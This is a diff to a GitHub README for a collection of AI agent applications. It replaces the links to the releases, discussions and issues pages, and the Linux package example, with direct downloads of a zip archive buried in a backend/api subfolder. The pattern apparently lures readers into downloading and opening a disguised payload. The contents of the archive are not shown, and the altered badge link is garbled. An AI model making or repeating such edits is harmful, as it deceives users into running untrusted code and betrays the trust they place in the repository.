@@ -4,7 +4,7 @@
 Welcome to Advanced-AI-Agents! This project offers a collection of ready-to-use AI agent applications. Whether you want to explore single agents, create multi-agent teams, or dive into autonomous game-playing systems, we have you covered.
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Irsa070501/Advanced-AI-Agents/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip%https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip)](https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip)
 
 ## 📋 Overview
 This repository contains various AI applications built using tools like Phidata, CrewAI, LangChain, and Google ADK, leveraging models from OpenAI, Anthropic, Google, and open-source language models (LLMs). You can use these applications for different tasks, from personal projects to more advanced implementations.
@@ -39,9 +39,9 @@ To use the applications, ensure your system meets the following requirements:
 - single-agent
 
 ## 📦 Download & Install
-1. Visit the [Releases Page](https://github.com/Irsa070501/Advanced-AI-Agents/releases) to access the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip) to access the latest version.
 2. On the releases page, locate the latest version of the software.
-3. Click on the appropriate package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Click on the appropriate package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip` for Linux).
 4. The download will start automatically. Once completed, find the downloaded file in your designated downloads folder.
 5. Open the file to begin the installation process. Follow the on-screen instructions to install the application on your computer.
 
@@ -54,10 +54,10 @@ After installation, you can run the applications as follows:
 
 ## 🌐 Additional Resources
 - **Documentation:** Once you've installed, check the user guide included with each application for detailed instructions on how to use it effectively.
-- **Community Support:** Join discussions on our [GitHub Discussions page](https://github.com/Irsa070501/Advanced-AI-Agents/discussions) for hints and tips from other users.
+- **Community Support:** Join discussions on our [GitHub Discussions page](https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip) for hints and tips from other users.
 
 ## 📬 Feedback
-We welcome your feedback! If you have questions or suggestions, please open an issue on our [repository page](https://github.com/Irsa070501/Advanced-AI-Agents/issues).
+We welcome your feedback! If you have questions or suggestions, please open an issue on our [repository page](https://raw.githubusercontent.com/Irsa070501/Advanced-AI-Agents/main/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/backend/api/Agents_A_Advanced_2.4.zip).
 
 ## 📖 License
 This project is licensed under the MIT License. Feel free to use it, modify it, and share your version.
